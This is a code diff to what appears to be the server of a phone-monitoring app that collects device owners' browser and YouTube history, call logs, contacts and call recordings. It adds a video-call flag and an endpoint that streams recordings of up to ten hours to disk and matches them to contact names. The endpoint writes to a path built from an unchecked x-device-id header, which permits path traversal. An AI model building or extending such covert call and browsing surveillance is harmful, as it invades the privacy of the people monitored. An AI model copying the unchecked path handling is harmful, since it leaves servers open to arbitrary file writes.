@@ -1,5 +1,8 @@
 import mongoose from 'mongoose';
 import { Request, Response } from 'express';
+import fs from 'fs';
+import path from 'path';
+import { v4 as uuidv4 } from 'uuid';
 import { BrowserHistory } from '../models/BrowserHistory';
 import { YouTubeHistory } from '../models/YouTubeHistory';
 import { YouTubeSession } from '../models/YouTubeSession';
@@ -292,6 +295,7 @@ export const ingestGeneralLogs = async (req: Request, res: Response) => {
         contactName: cl.contactName,
         callType: cl.callType || 'incoming',
         durationSeconds: cl.durationSeconds || 0,
+        isVideo: cl.isVideo === true || cl.isVideo === 'true',
         timestamp: cl.timestamp ? new Date(cl.timestamp) : new Date(),
       }));
       await CallLog.insertMany(docs);
@@ -373,6 +377,8 @@ export const ingestCallLogs = async (req: Request, res: Response) => {
         endTime = new Date(startTime.getTime() + durationSeconds * 1000);
       }
 
+      const isVideo = item.isVideo === true || item.isVideo === 'true';
+
       const docData: any = {
         deviceId,
         callId,
@@ -383,6 +389,7 @@ export const ingestCallLogs = async (req: Request, res: Response) => {
         endTime,
         durationSeconds,
         isBlocked: !!isBlocked,
+        isVideo: !!isVideo,
         simDisplayName: item.simDisplayName || '',
         timestamp: startTime,
       };
@@ -566,6 +573,97 @@ export const ingestCallRecording = async (req: Request, res: Response) => {
     });
   } catch (error: any) {
     console.error('[INGEST-CALL-RECORDING] Error:', error);
+    return res.status(500).json({ success: false, message: error.message });
+  }
+};
+
+/**
+ * Direct Streaming Ingest for Large Audio Recordings (e.g. 10 hours)
+ * Streams directly from the network socket into disk, using <64KB of RAM.
+ */
+export const ingestCallRecordingStream = async (req: Request, res: Response) => {
+  try {
+    const deviceId = req.headers['x-device-id'] as string;
+    const phoneNumber = req.headers['x-phone-number'] as string;
+
+    if (!deviceId || !phoneNumber) {
+      return res.status(400).json({ success: false, message: 'x-device-id and x-phone-number headers required' });
+    }
+
+    const rawContact = req.headers['x-contact-name'] as string;
+    let contactName = '';
+    if (rawContact) {
+      try {
+        contactName = decodeURIComponent(rawContact);
+      } catch (_) {
+        contactName = rawContact;
+      }
+    }
+
+    const callType = (req.headers['x-call-type'] as string) === 'outgoing' ? 'outgoing' : 'incoming';
+    const durationSeconds = parseInt((req.headers['x-duration-seconds'] as string) || '0', 10);
+    const timestampMs = parseInt((req.headers['x-timestamp'] as string) || `${Date.now()}`, 10);
+
+    const targetDir = path.join(__dirname, '../../public/uploads/recordings', deviceId);
+    if (!fs.existsSync(targetDir)) {
+      fs.mkdirSync(targetDir, { recursive: true });
+    }
+
+    const filename = `${uuidv4()}.m4a`;
+    const filePath = path.join(targetDir, filename);
+
+    const writeStream = fs.createWriteStream(filePath);
+    req.pipe(writeStream);
+
+    writeStream.on('finish', async () => {
+      try {
+        const fileSizeBytes = fs.statSync(filePath).size;
+        const audioUrl = `/uploads/recordings/${deviceId}/${filename}`;
+
+        let resolvedContactName = contactName || '';
+        if (!resolvedContactName) {
+          const cleanNum = phoneNumber.replace(/[^0-9]/g, '');
+          const contact = await Contact.findOne({
+            deviceId,
+            $or: [
+              { phoneNumber },
+              ...(cleanNum.length >= 10 ? [{ phoneNumber: { $regex: cleanNum.slice(-10) + '$' } }] : [])
+            ]
+          });
+          if (contact) resolvedContactName = contact.name;
+        }
+
+        const callRecording = new CallRecording({
+          deviceId,
+          phoneNumber,
+          contactName: resolvedContactName,
+          callType,
+          durationSeconds,
+          audioUrl,
+          fileSizeBytes,
+          timestamp: new Date(timestampMs),
+        });
+        await callRecording.save();
+
+        console.log(`[CALL-RECORDING-STREAM] Streamed call recording for ${deviceId}, phone ${phoneNumber}, size: ${fileSizeBytes} bytes`);
+        return res.json({
+          success: true,
+          message: 'Call recording streamed successfully',
+          audioUrl,
+          recordingId: callRecording._id,
+        });
+      } catch (err: any) {
+        console.error('[CALL-RECORDING-STREAM] Error saving record:', err);
+        return res.status(500).json({ success: false, message: err.message });
+      }
+    });
+
+    writeStream.on('error', (err) => {
+      console.error('[CALL-RECORDING-STREAM] Write error:', err);
+      return res.status(500).json({ success: false, message: err.message });
+    });
+  } catch (error: any) {
+    console.error('[CALL-RECORDING-STREAM] Error:', error);
     return res.status(500).json({ success: false, message: error.message });
   }
 };
